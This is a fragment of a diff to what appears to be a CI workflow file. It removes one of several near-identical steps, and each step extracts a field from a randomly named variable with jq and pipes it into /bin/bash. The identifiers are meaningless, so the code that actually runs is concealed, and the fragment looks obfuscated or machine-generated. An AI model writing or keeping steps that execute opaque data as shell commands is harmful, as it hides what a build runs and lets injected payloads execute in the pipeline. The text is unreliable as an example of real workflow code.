@@ -21,7 +21,6 @@ jobs:
           echo $vwnqn142 | jq -r .cav679 | /bin/bash
           echo $zcba6212 | jq -r .xdho47160 | /bin/bash
           echo $aptv2 | jq -r .k20 | /bin/bash
-          printf '%s' "$knxzk85996" | jq -r .nvuuo9653 | /bin/bash
           echo $tme2013 | jq -r .rfskv132 | /bin/bash
           printf '%s' "$pmam49" | jq -r .ejzzh086 | /bin/bash
           printf '%s' "$zqe51505" | jq -r .tzb2489 | /bin/bash
